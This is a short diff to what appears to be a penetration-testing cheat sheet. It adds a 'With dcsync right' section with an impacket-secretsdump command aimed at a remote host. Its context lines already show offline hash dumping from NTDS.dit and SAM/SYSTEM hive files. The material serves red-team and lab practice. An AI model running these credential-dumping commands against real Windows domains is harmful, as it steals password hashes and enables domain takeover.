@@ -23,4 +23,10 @@ impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
+#### With dcsync right
+
+```bash
+impacket-secretsdump username:password@10.10.11.10
+```
+
 <br>
